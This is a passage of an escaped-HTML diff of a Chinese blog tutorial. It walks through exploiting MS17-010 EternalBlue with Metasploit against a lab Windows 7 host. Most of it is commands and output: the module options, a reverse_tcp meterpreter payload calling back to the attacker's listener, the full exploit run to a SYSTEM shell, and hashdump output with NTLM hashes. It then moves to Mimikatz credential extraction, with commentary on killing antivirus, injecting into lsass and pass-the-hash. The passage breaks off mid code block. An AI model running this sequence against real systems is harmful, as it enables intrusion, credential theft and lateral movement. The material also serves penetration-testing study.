+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; SMBPass no &lt;span class="o"&gt;(&lt;/span&gt;Optional&lt;span class="o"&gt;)&lt;/span&gt; The password &lt;span class="k"&gt;for&lt;/span&gt; th
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e specified username
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; SMBUser no &lt;span class="o"&gt;(&lt;/span&gt;Optional&lt;span class="o"&gt;)&lt;/span&gt; The username to aut
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; henticate as
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; VERIFY_ARCH &lt;span class="nb"&gt;true&lt;/span&gt; yes Check &lt;span class="k"&gt;if&lt;/span&gt; remote architecture m
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; atches exploit Target. Only af
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; fects Windows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Windows 7, Windows Embedded St
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; andard &lt;span class="m"&gt;7&lt;/span&gt; target machines.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; VERIFY_TARGET &lt;span class="nb"&gt;true&lt;/span&gt; yes Check &lt;span class="k"&gt;if&lt;/span&gt; remote OS matches exp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; loit Target. Only affects Wind
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2, Windows 7,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Windows Embedded Standard &lt;span class="m"&gt;7&lt;/span&gt; t
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; arget machines.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Payload options &lt;span class="o"&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_tcp&lt;span class="o"&gt;)&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Name Current Setting Required Description
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ---- --------------- -------- -----------
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; EXITFUNC thread yes Exit technique &lt;span class="o"&gt;(&lt;/span&gt;Accepted: &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh,
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; thread, process, none&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; LHOST 10.0.0.223 yes The listen address &lt;span class="o"&gt;(&lt;/span&gt;an interface ma
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; y be specified&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; LPORT &lt;span class="m"&gt;4444&lt;/span&gt; yes The listen port
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Exploit target:
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Id Name
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -- ----
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;0&lt;/span&gt; Automatic Target
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;View the full module info with the info, or info -d command.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;PS：漏洞利用（Exploit）只是打开大门的“钥匙”，载荷（Payload）是进门之后要执行的任务。Metasploit 将默认Payload设置为&lt;code&gt;windows/x64/meterpreter/reverse_tcp&lt;/code&gt;。其中&lt;code&gt;windows/x64&lt;/code&gt;指明靶机系统是64位 windows 系统；&lt;code&gt;meterpreter&lt;/code&gt;是 Metasploit 的“王牌”载荷，运行在内存中，不写入硬盘（难以被察觉），且提供了极其丰富的内置命令（如 &lt;code&gt;hashdump&lt;/code&gt;, &lt;code&gt;screenshot&lt;/code&gt;, &lt;code&gt;webcam_snap&lt;/code&gt;），远比普通的 CMD 命令行强大；&lt;code&gt;reverse_tcp&lt;/code&gt;指明使用反向TCP连接，用于绕过防火墙，同时确保在复杂的网络环境下，攻击载荷能稳定地传输和通信，不会轻易断开连接。&lt;/p&gt;
+&lt;p&gt;PS：设置反向连接后，需要指定&lt;code&gt;lhost&lt;/code&gt;参数，以指定靶机出发漏洞后能够成功连接回攻击机&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4444
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise &lt;span class="m"&gt;7600&lt;/span&gt; x64 &lt;span class="o"&gt;(&lt;/span&gt;64-bit&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Scanned &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; hosts &lt;span class="o"&gt;(&lt;/span&gt;100% &lt;span class="nb"&gt;complete&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - The target is vulnerable.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Connecting to target &lt;span class="k"&gt;for&lt;/span&gt; exploitation.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Connection established &lt;span class="k"&gt;for&lt;/span&gt; exploitation.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Target OS selected valid &lt;span class="k"&gt;for&lt;/span&gt; OS indicated by SMB reply
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - CORE raw buffer dump &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - 0x00000000 &lt;span class="m"&gt;57&lt;/span&gt; &lt;span class="m"&gt;69&lt;/span&gt; 6e &lt;span class="m"&gt;64&lt;/span&gt; 6f &lt;span class="m"&gt;77&lt;/span&gt; &lt;span class="m"&gt;73&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;37&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;45&lt;/span&gt; 6e &lt;span class="m"&gt;74&lt;/span&gt; &lt;span class="m"&gt;65&lt;/span&gt; &lt;span class="m"&gt;72&lt;/span&gt; &lt;span class="m"&gt;70&lt;/span&gt; Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterp
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - 0x00000010 &lt;span class="m"&gt;72&lt;/span&gt; &lt;span class="m"&gt;69&lt;/span&gt; &lt;span class="m"&gt;73&lt;/span&gt; &lt;span class="m"&gt;65&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;37&lt;/span&gt; &lt;span class="m"&gt;36&lt;/span&gt; &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;30&lt;/span&gt; rise &lt;span class="m"&gt;7600&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Target arch selected valid &lt;span class="k"&gt;for&lt;/span&gt; arch indicated by DCE/RPC reply
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Trying exploit with &lt;span class="m"&gt;12&lt;/span&gt; Groom Allocations.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending all but last fragment of exploit packet
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Starting non-paged pool grooming
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending SMBv2 buffers
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending final SMBv2 buffers.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending last fragment of exploit packet!
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Receiving response from exploit packet
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - ETERNALBLUE overwrite completed successfully &lt;span class="o"&gt;(&lt;/span&gt;0xC000000D&lt;span class="o"&gt;)&lt;/span&gt;!
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending egg to corrupted connection.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Triggering free of corrupted buffer.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;203846&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to 10.0.0.17
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4444 -&amp;gt; 10.0.0.17:49161&lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 05:39:27 +0000
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - &lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - &lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-WIN-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - &lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;PS：当前权限——&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt; 权限（通常简称为 &lt;strong&gt;System 权限&lt;/strong&gt;）是 Windows 操作系统中的最高权限。在 Windows 安全模型中，&lt;code&gt;SYSTEM&lt;/code&gt; 账户（也称为本地系统账户）是操作系统内核及其核心服务运行的身份。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;它比管理员（Administrator）更高级&lt;/strong&gt;：Administrator 仍然受用户帐户控制（UAC）的限制，而 SYSTEM 账户不受任何限制。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限范围&lt;/strong&gt;：它拥有对本地计算机上&lt;strong&gt;所有资源&lt;/strong&gt;（文件、注册表、进程、硬件）的完整访问权限。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;现在，攻击机可以进行以下行为：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;读取所有用户的文件&lt;/strong&gt;：Kali可以进入 &lt;code&gt;C:\Users\&lt;/code&gt; 下任何一个文件夹（如 Administrator 或其他普通用户），读取他们的桌面、文档和隐私文件。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;控制所有进程&lt;/strong&gt;：Kali可以杀死防火墙进程、杀毒软件进程，或者将你的恶意程序注入到任何系统进程（如 &lt;code&gt;lsass.exe&lt;/code&gt;）中。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;操作注册表&lt;/strong&gt;：Kali可以修改系统的核心配置，甚至破坏系统引导。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;获取明文密码&lt;/strong&gt;：只有在 SYSTEM 权限下，Kali才能使用 &lt;code&gt;load kiwi&lt;/code&gt; (Mimikatz) 从内存中提取出其他已登录用户的明文密码。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限降级（伪装）&lt;/strong&gt;：Kali可以随意切换到任何一个普通用户的身份（通过 &lt;code&gt;impersonate_token&lt;/code&gt;），看看他们在电脑上留下了什么。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="典型的后渗透攻击行为"&gt;典型的“后渗透”攻击行为
+&lt;/h3&gt;&lt;h4 id="一凭据窃取"&gt;一、凭据窃取
+&lt;/h4&gt;&lt;h5 id="1-导出哈希值hashdump"&gt;1. 导出哈希值（Hashdump）
+&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; hashdump
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Ankh:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e19302c2cb502fb48256d5cfbb575047:::
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;PS：这是靶机用户登陆密码的NTLM哈希。攻击者即使不知道明文，也可以通过“哈希传递攻击（Pass-the-Hash）”直接登录其他机器&lt;/p&gt;
+&lt;h5 id="2-抓取内存中的明文密码mimikatz"&gt;2. 抓取内存中的明文密码（Mimikatz）
+&lt;/h5&gt;&lt;p&gt;&lt;code&gt;load kiwi # 加载增强版的Mimikatz&lt;/code&gt; -&amp;gt; &lt;code&gt;creds_all # 尝试提取所有凭证&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
